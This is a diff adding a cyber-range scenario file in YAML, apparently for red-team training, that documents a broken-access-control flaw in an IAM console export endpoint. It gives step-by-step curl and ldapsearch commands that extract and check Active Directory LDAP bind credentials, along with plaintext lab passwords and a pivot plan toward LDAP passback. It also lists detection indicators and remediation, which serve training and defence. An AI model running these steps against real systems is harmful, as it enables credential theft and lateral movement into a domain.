@@ -1,0 +1,56 @@
+id: red_05_cld-iam_bac_ad_export
+name: "Broken Access Control — IAM Integration Export Exposes AD LDAP Credentials"
+range: RNG-CLD-01
+machine: M5-cld-iam
+mitre:
+  - technique: T1078.004
+    name: "Valid Accounts: Cloud Accounts"
+  - technique: T1199
+    name: "Trusted Relationship"
+cwe:
+  - CWE-862  # Missing Authorization
+cvss: "9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)"
+owasp: "A01:2021 — Broken Access Control"
+description: |
+  The PUL Cloud IAM Console /api/v1/integrations/{id}/export endpoint enforces
+  access restrictions only at the UI layer (hidden button for non-admins).
+  The server performs no role check. Any authenticated iam_user can call the
+  endpoint directly to obtain full AD integration config including LDAP bind
+  credentials, enabling pivot to the Active Directory range via LDAP Passback.
+entry_condition: "cloud-iam-svc:IAm@CLD!2025 (from M4 container image ENV)"
+prereqs:
+  - Valid IAM Console credentials (any role)
+  - Network access to 11.0.2.50:8080
+steps:
+  - id: 1
+    name: "Login as iam_user, get JWT"
+    cmd: "curl -s -X POST http://11.0.2.50:8080/api/v1/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"cloud-iam-svc\",\"password\":\"IAm@CLD!2025\"}'"
+  - id: 2
+    name: "Enumerate integrations"
+    cmd: "curl -s http://11.0.2.50:8080/api/v1/integrations -H 'Authorization: Bearer $TOKEN'"
+  - id: 3
+    name: "Exploit BAC — call admin export endpoint as iam_user"
+    cmd: "curl -s http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export -H 'Authorization: Bearer $TOKEN'"
+  - id: 4
+    name: "Validate AD credentials"
+    cmd: "ldapsearch -x -H ldap://33.55.55.137 -D 'CN=svc_ldap,CN=Users,DC=cyberange,DC=local' -w 'Ld@pB1nd#2025!' -b 'DC=cyberange,DC=local' '(objectClass=user)' sAMAccountName"
+output:
+  credential: "svc_ldap:Ld@pB1nd#2025! @ cyberange.local (33.55.55.137)"
+  next_target: "RNG-AD-01 via SRV08-WEB LDAP Passback (33.55.55.129/admin/)"
+artifacts:
+  - "/var/log/pul-cloud/iam.log"
+  - "/opt/pul-cloud-iam/app.py (export route, no role check)"
+detection_indicators:
+  - "iam_user role accessing /export endpoint — HTTP 200 response"
+  - "API call to /export without prior UI page load (direct API abuse)"
+remediation:
+  - "Add server-side role check: require iam_admin on /export endpoints"
+  - "Move LDAP bind password to Vault/Secrets Manager"
+  - "Restrict SRV08-WEB admin panel to internal IPs only"
+  - "Implement API authorization integration tests in CI pipeline"
+pivot_to_ad:
+  mechanism: "LDAP Passback via SRV08-WEB /admin/ LDAP config change"
+  target_ip: "33.55.55.129"
+  bind_account: "svc_ldap"
+  domain_controller: "33.55.55.137"
+  note: "SRV08-WEB admin panel must be pre-configured with svc_ldap bind account for passback to work"
